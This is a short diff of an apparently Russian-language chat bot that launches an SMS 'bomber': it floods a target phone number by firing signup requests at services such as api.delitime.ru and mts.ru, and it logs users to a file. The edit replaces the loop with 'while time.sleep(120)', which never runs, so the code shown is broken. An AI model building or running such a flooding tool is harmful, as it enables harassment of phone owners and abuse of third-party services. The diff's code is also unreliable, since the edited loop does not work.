@@ -109,7 +109,7 @@ try:
                     write_message(user, '💣 Спам запущен!')
                     write_message(user, "Номер: " f'{userr}' "\nВремя: 2 минуты!")
 
-                    while True:
+                    while time.sleep(120):
                         try:
                             requests.post(
                                 "https://api.delitime.ru/api/v2/signup",
@@ -313,7 +313,7 @@ try:
                             print(colored('mts.ru-[+]', 'cyan'))
                         except:
                             print(colored('mts.ru-[-]', 'cyan'))
-                        time.sleep(120)
+                  
                     suserr.remove(str(user))
                     for s in suserr:
                         file = open('bazan.txt', 'a', encoding='utf-8')
